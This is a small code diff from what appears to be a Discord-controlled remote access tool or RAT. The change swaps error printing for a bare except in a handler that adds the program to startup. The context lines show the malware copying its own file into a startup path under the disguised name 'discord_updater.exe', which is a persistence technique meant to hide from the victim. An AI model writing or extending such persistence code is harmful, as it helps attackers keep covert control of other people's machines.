@@ -151,8 +151,7 @@ async def on_message(message):
             shutil.copyfile(os.path.join(os.getcwd(), __file__), os.path.join(path, "discord_updater.exe"))
             embed = discord.Embed(title="Startup", description=f"```{os.path.join(path, 'discord.exe')}```", color=0xfafafa)
             await message.reply(embed=embed)
-        except Exception as e:
-            print(e)
+        except:
             embed = discord.Embed(title="Error", description=f"```Failed to add to startup```", color=0xfafafa)
             await message.reply(embed=embed)
 
